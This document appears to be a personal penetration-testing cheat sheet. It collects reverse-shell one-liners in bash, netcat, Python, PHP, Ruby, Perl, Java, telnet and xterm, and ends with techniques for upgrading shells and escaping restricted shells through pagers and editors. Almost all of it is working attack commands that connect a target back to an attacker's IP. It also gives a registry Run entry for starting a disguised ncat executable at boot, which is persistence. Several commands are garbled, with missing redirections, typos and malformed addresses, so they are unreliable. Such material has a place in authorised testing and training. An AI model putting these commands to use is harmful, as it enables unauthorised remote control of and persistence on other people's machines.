# Nc & Reverse shells

### Netcat

[http://www.madirish.net/156](http://www.madirish.net/156)

`nc -nlvp 4444` netcat listner on port 4444

`nc -n 10.10.14.12 4444` connect to port 4444 on ip-adress 10.10.14.12

`-n` nummers only IP adresses, no DNS

`-l`listen mode

`-v` verbose

`-p` local port number

### Reverse Shell Cheat Sheet

[https://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/](https://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/)

[http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

[https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)

[http://blog.safebuff.com/2016/06/19/Reverse-shell-Cheat-Sheet/](http://blog.safebuff.com/2016/06/19/Reverse-shell-Cheat-Sheet/)

[https://github.com/xapax/security/blob/master/reverse-shell.md](https://github.com/xapax/security/blob/master/reverse-shell.md)

--

**More info about the Bash reverse shell**

[https://hackernoon.com/reverse-shell-cf154dfee6bd](https://hackernoon.com/reverse-shell-cf154dfee6bd)

#### **BASH**

Setup a listener on the attacker box \(you\). On the target box execute one of the following commands:

`bash -i >& /dev/tcp/yourIP/4444 0>&1`

`bash -i & /dev/tcp/10.0.0.1/4444 0 &1` RTFM version

`exec /bin/bash 0&0 2>&0`

`0<&196; exec 196 <>/dev/tcp/yourIP/4444; sh <&196 >&196 2>&196`

My new fav reverse shell: $ /bin/bash -i &gt; & /dev/tcp/\[ip\_address\]/\[port\] 0&gt;&1

Just remember that some shells don't honour /dev/tcp/\* like bash does so wrap it in /bin/bash -c '...' if it doesn't work!

#### NETCAT

**\#1 Netcat \(target box\)**

`nc -e yourIP 1234 /bin/sh` Linux reverse shell

`nc -e /bin/sh 10.10.10.68 1234` RTFM version.

Set an entry in the registry for running the disguised ncat executable on startup. `Computer\HKEYLOCALMACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`

Path to winconfig `"C:\Windows\System32\winconfig.exe 192.168.102.145 5555 -e cmd.exe"`

`nc 10.0.0.1 1234 -e cmd.exe` Windows reverse shell

_**Attacker \(You\)**_

`nc -nlvp 1234`

**\#1b Netcat \(\* start listener on target box to catch shell\)**

`nc -nlvp 4444`

_**Attacker \(You\)**_

`nc -e 10.0.0.1 1234 /bin/sh` Linux reverse shell

`nc -e /bin/sh 10.10.10,68 1234` RTFM version

`nc 10.0.0.1 1234 -e cmd.exe` Windows reverse shell

**\#2 No -e option \(target box\)**

`mknod backpipe p && nc 10.10.14.12 4444 0<backpipe | /bin/bash 1>backpipe` or

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1|nc 10.0.0.1 1234 > /tmp/f`

`rm -f /tmp/p; mknod /tmp/p p && nc yourIP 4444 0/tmp/p`

_**Attacker \(You\)**_

`nc -nlvp 4444`

**\#3 Netcat without netcat**

`/bin/bash -i > /dev/tcp/10.10.14.12/4444 0<&1 2>&1`

_**Attacker \(You\)**_

`nc -nlvp 4444`

**\#4 Netcat without or /dev/tcp**

`mknod backpipe p && telnet 10.10.14.12 4444 0<backpipe | /bin/bash 1>backpipe`

`rm -f /tmp/p; mknod /tmp/p && telnet yourIP 4444 0/tmp/p`

_**Attacker \(You\)**_

`nc -nlvp 4444`

#### PYTHON

`python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("10.10.14.12", 5555)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); p=subprocess.call (["/bin/sh" ,"-i"]);'`

#### **PHP**

`php -r '$sock=fsockopen("yourIP", 4444); exec("/bin/sh -i <&3 >&3 2>&3");'`

`php -r '$sock=fsockopen("10.0.0.1", 1234); exec("/bin/sh -i &3 &3 2 &3");'` RTFM version

#### RUBY

`ruby -r socket -e'f=TCPSocket.open("10.20.14", 8080).to_i; exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`

`ruby -r socket -e'f=TCPSocket.open("10.20.14", 8080).to_i; exec sprintf("/bin/sh -i &%d &%d 2 &%d",f,f,f)'` RTFM version

#### TELNET

`rm -f /tmp/p; minor /tmp/p && telnet attacker 4444 0/tmp/p`

`telnet attackerip 4444 | /bin/bash " telnet attackerip 4445`

#### XTERM

`xterm -display 10.0.0.1:1`

`Start Listener: Xnest :1`

`Add permission to connect: xhost +victimIP`

### PERL

`perl -e 'use Socket; $i="yourIP"; $p=1234; socket(S, PF INET, SOCK STREAM, getprotobjname("tcp")); if(connect(S,sockaddr_in($p, inet-aton($i)))) {open(STDIN, " &S"); open(STDOUT, "&S"); open(STDERR," &S"); exec("/bin/sh -I"); };'`

`perl- e 'use Socket; $i="10.20.14"; $p=8080; socket(S, PF_INET, SOCK_STREAM, getprotobyname("tcp")); if(connect(S,sockaddr_in($p, inet_aton($i)))) {open(STDIN,">&S"); open(STDOUT, ">&S"); open(STDERR, ">&S"); exec("/bin/sh -i");};'`

**Perl without /bin/sh**

`perl -MIO -e '$p=fork; exit, if($p); $c=new IO::Socket::INET(PeerAddr, "yourIP:4444"); STDIN- fdopen($c, r); $~- fdopen($c,w); system$_ while ;'`

**Perl for Windows**

`perl -MIO -e '$c=new IO::Socket::INET(PeerAddr, "attackerip:4444"); STDIN- fdopen($c,r); $~- fdopen($c,w); system$_ while ;'`

### JAVA

`r = Runtime.getRuntime()`

`p = r.exec(["/bin/bash", "-c", "exec 5 /dev/tcp/yourIP/1234; cat &5 | while read line; do \$line 2>&5 >&5; done"] as String[])`

`p.waitFor()`

## Escape restricted shell

[https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)

**Make shell interactive**

[https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)

[https://netsec.ws/?p=337](https://netsec.ws/?p=337)

I have seen a lot of people ask about this yet there are not too many good online resources that explain it simply.

When obtaining a reverse shell with a Netcat listener, it is by default non-interactive and you cannot pass keyboard shortcuts or special characters such as tab.

It is quite simple to work around. For starters, in your shell, run`python -c 'import pty;pty.spawn("/bin/bash");'`to obtain a partially interactive bash shell. Sometimes people use `/bin/sh`

> After that, do`CTRL+Z`to background Netcat. Enter`stty raw -echo`in your terminal, which will tell your terminal to pass keyboard shortcuts etc. through. Once that is done, run the command`fg`to bring Netcat back to the foreground. Note you will not be able to see what you are typing in terminal after you change your stty setting. You should now have tab autocomplete as well as be able to use interactive commands such as`su`and`nano`.

If you want to see it in action, check out ippsec's YouTube videos, as he uses this exact method in quite a few of them: [ippsec's channel](https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA)

**Shell Spawning**

```text
python -c 'import pty; pty.spawn("/bin/sh")'
```

```text
echo os.system('/bin/bash')
```

```text
/bin/sh -i
```

```text
perl â€”e 'exec "/bin/sh";'
```

**Enable autocomplete**

`ctrl-Z`for put to background

`stty raw -echo`

`fg enter` for foreground

_**More, Less, and Man Commands**_

There is a known escape within these commands. After you use the 'more', 'less', or 'man' command with a file, type '!' followed by a command. For instance, try the following once inside the file:

```text
'! /bin/sh'
'!/bin/sh'
'!bash'
```

Like the shell escape in 'awk' and 'find', if successful, you'll be sitting at an unrestricted shell prompt. Note you can try different shells, and the space after the '!' may not matter.

_**Editors**_

One of the most well documented techniques is to spawn a shell from within an editor such as 'vi' or 'vim'. Open any file using one of these editors and type the following and execute it from within the editor:

```text
:set shell=/bin/bash
```

Next, type and execute:

```text
:shell
```

Another method is to type:

```text
:! /bin/bash
```

If either of these works, you will have an unrestricted shell from within the editor. Most modern restricted shells already defend against this hack, but it's always worth a shot. You may be working from a restricted editor such as rvi or rvim, which will almost certainly stop a shell from spawning. Also, try different shells with this technique and ones that follow as some restricted shells may block 'sh' or 'bash'.

